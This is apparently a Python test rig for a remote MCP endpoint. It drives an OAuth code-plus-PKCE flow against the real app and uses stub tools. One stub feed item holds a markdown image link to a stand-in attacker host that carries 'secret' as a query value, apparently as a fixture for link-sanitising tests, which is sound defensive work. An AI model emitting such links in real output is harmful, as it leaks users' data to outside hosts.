"""A rig for the remote MCP endpoint's tests: the real app over an in-process ASGI transport, a stub FastMCP that has
the real tools' names (so the real guards, scopes and allowlist are what is tested), a moving clock, and a scripted
OAuth client that does the whole code + PKCE flow, approving the way the person's terminal does."""
from __future__ import annotations

import base64
import contextlib
import hashlib
import secrets
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

import httpx

from emporia import features, mcp_surface
from emporia import remote as R
from emporia.remote import server

URL = "https://emporia.example.net"
AGENT = "alpha-agent"
REDIRECT = "http://127.0.0.1:9999/callback"


class Clock:
    def __init__(self, t: float = 1_900_000_000.0) -> None:
        self.t = t

    def __call__(self) -> float:
        return self.t

    def advance(self, seconds: float) -> None:
        self.t += seconds


def pkce() -> tuple[str, str]:
    verifier = secrets.token_urlsafe(48)
    return verifier, base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).decode().rstrip("=")


def stub_mcp():
    """A FastMCP holding one stub per real tool name, run through the real surface (guards and shape), plus a few
    with real argument shapes for the tests that call them."""
    from fastmcp import FastMCP
    from fastmcp.tools import Tool

    mcp = FastMCP("remote-test")
    shaped = {
        "read_feed": lambda limit=20, topic="", agent_id="": {"success": True, "limit": limit, "items": [
            {"id": 1, "text": "see ![pic](https://evil.example/x.png?d=secret) and [click](https://evil.example/a) "
                              "or https://evil.example/b and <https://evil.example/c>"}]},
        "post": lambda text, topic="", agent_id="": {"success": True, "posted": True},
        "send_room_message": lambda room_id, text, agent_id="": {"success": True},
        "react": lambda target, value="like", on=True, to_agent="", agent_id="": {"success": True},
        "follow": lambda target, agent_id="": {"success": True},
        "whats_next": lambda limit=8, since="": {"success": True, "next": ["post something"]},
        "my_quests": lambda agent_id="": {"success": True, "quests": []},
        "chronicle": lambda join=None: {"success": True, "joined": bool(join)},
        "scan_relays": lambda kind="pointer", relays=None: {"success": True, "relays": relays or []},
        "get_inbox": lambda unread_only=True, limit=50, agent_id="": {"success": True, "count": 2, "events": [
            {"inbox_id": 1, "event_type": "dm_received", "payload": {"type": "dm_received", "sender_id": "bob",
                                                                        "content": "private words", "encrypted": False}},
            {"inbox_id": 2, "event_type": "challenge", "payload": {"type": "challenge", "from": "bob"}}]},
        "list_rooms": lambda: {"success": True, "rooms": [{"id": i, "about": "x" * 1000} for i in range(300)]},
        "fund_session": lambda session_id="", agent_id="": {"success": True, "funded": True},
        "get_dm_messages": lambda thread_id="", agent_id="": {"success": True, "messages": [{"content": "x"}]},
        "send_dm": lambda to_agent_id="", text="", agent_id="": {"success": True},
        "join_room": lambda room_id="", agent_id="": {"success": True},
    }
    names = set(features.all_tools())
    for name, fn in shaped.items():
        mcp.tool(name=name)(fn)
        names.discard(name)
    for name in sorted(names):
        def generic() -> dict:
            return {"success": True}
        mcp.tool(name=name)(generic)
    mcp_surface.apply(mcp, [c for c in mcp.local_provider._components.values() if isinstance(c, Tool)])
    return mcp


class Rig:
    def __init__(self, tmp_path: Path, monkeypatch, scopes=(R.SCOPE_READ, R.SCOPE_TALK), url: str = URL,
                 clock: Clock | None = None, mcp=None, read_only: bool = False) -> None:
        self.clock = clock or Clock()
        self.url = url
        self.folder = tmp_path / "keys" / "remote"
        monkeypatch.setenv("EMPORIA_AGENT_ID", AGENT)
        monkeypatch.setenv("EMPORIA_FEATURES", "readonly" if read_only else "federation,money")
        monkeypatch.setenv("EMPORIA_DM_AGENT_ACCESS", "full")          # build() sets person; monkeypatch restores
        # what other tests left in this process (login tokens a server registered, a label) must not look like a
        # secret in these tests' posts: the outbound block has its own test, which sets what it needs
        from emporia import autonomy, identity_card, secret_guard
        monkeypatch.setattr(autonomy, "TOKEN_SOURCES", [])
        monkeypatch.setattr(autonomy, "live_commit_secrets", lambda agent_id: [])
        monkeypatch.setattr(identity_card, "operator_label", lambda: "")
        monkeypatch.setattr(secret_guard, "own_secrets", lambda agent_id: [])
        self.mcp = mcp or stub_mcp()
        self.app, self.auth, self.info = server.build(url, tuple(scopes), AGENT, folder=self.folder, clock=self.clock,
                                                      mcp=self.mcp)
        self.audit = self.auth.audit
        self.store = self.auth.store
        self.limits = self.app.limits

    @contextlib.asynccontextmanager
    async def running(self, peer: str = "127.0.0.1", headers: dict | None = None):
        async with self.app.inner.lifespan(self.app.inner):
            transport = httpx.ASGITransport(app=self.app, client=(peer, 50123))
            async with httpx.AsyncClient(transport=transport, base_url=self.url, headers=headers or {}) as c:
                yield Client(self, c)


class Client:
    def __init__(self, rig: Rig, http: httpx.AsyncClient) -> None:
        self.rig, self.http = rig, http
        self.n = 0

    async def register(self, redirect: str = REDIRECT, **extra) -> dict:
        r = await self.http.post("/register", json={"client_name": "scripted client", "redirect_uris": [redirect],
                                                    **extra})
        assert r.status_code == 201, r.text
        return r.json()

    def authorize_params(self, client_id: str, challenge: str, scope: str = "emporia:read", **over) -> dict:
        p = {"response_type": "code", "client_id": client_id, "redirect_uri": REDIRECT, "scope": scope,
             "state": "st4te", "code_challenge": challenge, "code_challenge_method": "S256",
             "resource": self.rig.url + R.MCP_PATH}
        p.update(over)
        return {k: v for k, v in p.items() if v is not None}

    async def start(self, scope: str = "emporia:read", **over):
        """Register, begin the authorization. Returns (client, verifier, consent page path)."""
        reg = await self.register()
        verifier, challenge = pkce()
        r = await self.http.get("/authorize", params=self.authorize_params(reg["client_id"], challenge, scope, **over))
        assert r.status_code == 302, r.text
        return reg, verifier, r.headers["location"]

    def approve(self, scopes: list[str] | None = None) -> dict:
        """The person's terminal: approve the one pending request."""
        rows = self.rig.auth.pending_rows()
        assert len(rows) == 1, rows
        return self.rig.auth.approve(rows[0]["code"], scopes)

    async def finish(self, reg: dict, verifier: str, page: str, delay: float = 0, **over) -> httpx.Response:
        status = (await self.http.get(page + "/status")).json()
        self.rig.clock.advance(delay)
        assert status["status"] == "approved", status
        q = parse_qs(urlsplit(status["redirect"]).query)
        form = {"grant_type": "authorization_code", "code": q["code"][0], "code_verifier": verifier,
                "client_id": reg["client_id"], "redirect_uri": REDIRECT, "resource": self.rig.url + R.MCP_PATH}
        form.update(over)
        return await self.http.post("/token", data={k: v for k, v in form.items() if v is not None})

    async def tokens(self, scope: str = "emporia:read emporia:talk", approve: list[str] | None = None) -> dict:
        reg, verifier, page = await self.start(scope)
        self.approve(approve)
        r = await self.finish(reg, verifier, page)
        assert r.status_code == 200, r.text
        out = r.json()
        out["client_id"] = reg["client_id"]
        return out

    async def rpc(self, token: str | None, method: str, params: dict | None = None, **headers) -> httpx.Response:
        self.n += 1
        h = {"Accept": "application/json, text/event-stream", **headers}
        if token:
            h["Authorization"] = f"Bearer {token}"
        body = {"jsonrpc": "2.0", "id": self.n, "method": method}
        if params is not None:
            body["params"] = params
        return await self.http.post(R.MCP_PATH, json=body, headers=h)

    async def tool(self, token: str, name: str, **arguments) -> dict:
        """The result of a tools/call as {'error': text} (a refusal) or the structured answer."""
        r = await self.rpc(token, "tools/call", {"name": name, "arguments": arguments})
        assert r.status_code == 200, (r.status_code, r.text)
        result = r.json()["result"]
        if result.get("isError"):
            return {"error": result["content"][0]["text"]}
        return result.get("structuredContent") or {"text": result["content"][0]["text"]}

    async def tool_names(self, token: str) -> set[str]:
        await self.rpc(token, "initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                                              "clientInfo": {"name": "t", "version": "1"}})
        r = await self.rpc(token, "tools/list")
        assert r.status_code == 200, r.text
        return {t["name"] for t in r.json()["result"]["tools"]}
